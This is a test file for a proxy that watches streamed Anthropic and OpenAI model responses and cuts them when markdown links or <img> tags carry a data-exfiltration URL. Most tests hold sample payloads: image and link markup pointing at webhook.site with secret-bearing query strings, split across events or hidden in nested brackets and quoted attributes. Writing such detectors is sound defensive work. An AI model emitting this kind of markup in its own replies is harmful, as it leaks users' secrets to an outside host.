import { describe, it, expect } from 'vitest'
import { ExfilStreamHold } from '../../src/proxy/streamExfil.js'
import { scanResponseExfil } from '../../src/detection/responseExfil.js'

// #551: in responseScan block mode a streamed response is held from the point
// model text opens markup (`[` or `<img`) until that markup settles, then the
// markup is scanned whole. Markup carrying an exfil URL cuts the stream;
// nothing of it has been forwarded. Every other event is forwarded as it
// arrives.

const isExfil = (text: string) => scanResponseExfil(text, h => h === 'webhook.site').length > 0
const anthropic = (text: string) => `event: content_block_delta\ndata: ${JSON.stringify({ type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text } })}\n\n`
const openai = (content: string) => `data: ${JSON.stringify({ choices: [{ index: 0, delta: { content } }] })}\n\n`
const toolArgs = (partial_json: string) => `event: content_block_delta\ndata: ${JSON.stringify({ type: 'content_block_delta', index: 1, delta: { type: 'input_json_delta', partial_json } })}\n\n`

/** Feeds each text as one event; the joined output, or null once cut. */
function run(texts: string[], wrap = anthropic): string | null {
  const hold = new ExfilStreamHold(isExfil)
  let out = ''
  for (const t of texts) {
    const r = hold.push(wrap(t))
    if (r === null) return null
    out += r
  }
  const r = hold.end()
  return r === null ? null : out + r
}

describe('ExfilStreamHold', () => {
  it('forwards events of plain text as they arrive', () => {
    const hold = new ExfilStreamHold(isExfil)
    expect(hold.push(anthropic('Hello '))).toBe(anthropic('Hello '))
    expect(hold.push(anthropic('world.\n'))).toBe(anthropic('world.\n'))
    expect(hold.end()).toBe('')
  })

  it('cuts a markdown image whose exfil URL is split across events, forwarding none of it', () => {
    const hold = new ExfilStreamHold(isExfil)
    let out = hold.push(anthropic('Intro line.\n'))
    out += hold.push(anthropic('Here is the chart ![chart](https://webhook.site/abc-'))
    expect(out).toBe(anthropic('Intro line.\n'))
    expect(hold.push(anthropic('123?d=secret-token)'))).toBeNull()
  })

  it('releases a benign link as soon as it closes, not at the end of the line', () => {
    const hold = new ExfilStreamHold(isExfil)
    expect(hold.push(anthropic('See [the docs](https://example.com/'))).toBe('')
    expect(hold.push(anthropic('docs) for details'))).toBe(anthropic('See [the docs](https://example.com/') + anthropic('docs) for details'))
    expect(hold.push(anthropic(' and more.'))).toBe(anthropic(' and more.'))
  })

  it('holds after ] only until the next character shows it opens no URL', () => {
    const hold = new ExfilStreamHold(isExfil)
    expect(hold.push(anthropic('const first = items[0'))).toBe(anthropic('const first = items[0'))
    expect(hold.push(anthropic(']'))).toBe('')
    expect(hold.push(anthropic(';'))).toBe(anthropic(']') + anthropic(';'))
  })

  // Markdown's own bracket rules (escapes, code spans, nesting) end link text
  // where a simple bracket counter would not. The secret is in the URL after
  // `](`, so every `](` is held to the end of its URL wherever it appears.
  it('cuts a ]( URL whatever the brackets before it look like', () => {
    expect(run(['[`]`](https://webhook.site/?d=1)'])).toBeNull()
    expect(run(['[a\\](https://example.com/) more](https://webhook.site/?d=1)'])).toBeNull()
    expect(run(['![[a](https://example.com/)](https://webhook.site/?d=1)'])).toBeNull()
    expect(run(['text ', '](https://webhook.site/?d=1) more'])).toBeNull()
  })

  it('does not close an <img at a > inside a quoted attribute', () => {
    expect(run(['<img alt=">" src="https://webhook.site/?d=1">'])).toBeNull()
    expect(run(["<img alt='>' ", "src='https://webhook.site/?d=1'>"])).toBeNull()
  })

  it('cuts a link that settles, then judges the next markup on the same line', () => {
    expect(run(['a [b](https://example.com/b) then ![c](https://webhook.site/', '?d=1) tail'])).toBeNull()
  })

  it('cuts an image whose URL never closes when the stream ends', () => {
    const hold = new ExfilStreamHold(isExfil)
    expect(hold.push(anthropic('![x](https://webhook.site/?d=s3cret'))).toBe('')
    expect(hold.end()).toBeNull()
  })

  it('cuts at the space that ends the URL, before a title arrives', () => {
    expect(run(['![a](https://webhook.site/?d=1 "ti'])).toBeNull()
  })

  it('cuts an image whose alt text spans a line break', () => {
    expect(run(['![first line\n', 'second](https://webhook.site/?d=1)'])).toBeNull()
  })

  it('cuts an image nested in a link and a link nested in brackets', () => {
    expect(run(['[![i](https://webhook.site/?d=1)](https://example.com/)'])).toBeNull()
    expect(run(['[a [b](https://webhook.site/?d=1) c]'])).toBeNull()
  })

  it('cuts an <img inside brackets that are not a link', () => {
    expect(run(['[ <img src="https://webhook.site/?d=1"> ]'])).toBeNull()
    expect(run(['[<img src="https://webhook.site/', '?d=1"> x] tail'])).toBeNull()
    expect(run(['[<img alt="a]" src="https://webhook.site/?d=1">'])).toBeNull()
  })

  it('cuts an <img whose attributes contain a whole markdown link', () => {
    expect(run(['[<img alt="a](x)" src="https://webhook.site/?d=1">'])).toBeNull()
    expect(run(['[<img src="https://webhook.site/?d=](x)1">'])).toBeNull()
    expect(run(['[<img alt=]\nsrc="https://webhook.site/?d=1">'])).toBeNull()
    expect(run(['<img alt="[x](https://example.com/)" src="https://webhook.site/?d=1">'])).toBeNull()
  })

  it('sees an <img that opens across two events', () => {
    const hold = new ExfilStreamHold(isExfil)
    expect(hold.push(anthropic('x <im'))).toBe(anthropic('x <im'))
    expect(hold.push(anthropic('g src="https://webhook.site/?d=1">'))).toBeNull()
  })

  it('releases an unclosed <img at a blank line', () => {
    const hold = new ExfilStreamHold(isExfil)
    expect(hold.push(anthropic('a <img stray\n'))).toBe('')
    expect(hold.push(anthropic('\nNext paragraph'))).toBe(anthropic('a <img stray\n') + anthropic('\nNext paragraph'))
  })

  it('does not hold on < that is not an image tag', () => {
    expect(new ExfilStreamHold(isExfil).push(anthropic('a <b> List<string>'))).toBe(anthropic('a <b> List<string>'))
  })

  it('works on OpenAI chat chunks and passes the [DONE] sentinel', () => {
    const hold = new ExfilStreamHold(isExfil)
    expect(hold.push(openai('plain\n'))).toBe(openai('plain\n'))
    expect(hold.push('data: [DONE]\n\n')).toBe('data: [DONE]\n\n')
    expect(run(['![i](https://webhook.site/?q=', 'k)'], openai)).toBeNull()
  })

  it('holds an event until it is complete, and accepts CRLF separators', () => {
    const hold = new ExfilStreamHold(isExfil)
    const ev = anthropic('plain text\n')
    expect(hold.push(ev.slice(0, 20))).toBe('')
    expect(hold.push(ev.slice(20))).toBe(ev)
    const crlf = `data: ${JSON.stringify({ choices: [{ delta: { content: 'ok' } }] })}\r\n\r\n`
    expect(hold.push(crlf)).toBe(crlf)
  })

  it('does not hold tool-call argument JSON, which is not rendered', () => {
    const hold = new ExfilStreamHold(isExfil)
    expect(hold.push(toolArgs('{"paths": ["a.ts", '))).toBe(toolArgs('{"paths": ["a.ts", '))
  })

  it('stays linear on a tag that never closes and on many short links', () => {
    let started = Date.now()
    const open = new ExfilStreamHold(isExfil)
    open.push(anthropic('<img '))
    for (let i = 0; i < 50000; i++) open.push(anthropic('aaaa '))
    expect(open.end()).not.toBeNull()
    expect(Date.now() - started).toBeLessThan(3000)
    started = Date.now()
    const links = new ExfilStreamHold(isExfil)
    for (let i = 0; i < 50000; i++) links.push(anthropic('[a](b) '))
    expect(links.end()).not.toBeNull()
    expect(Date.now() - started).toBeLessThan(3000)
  })
})
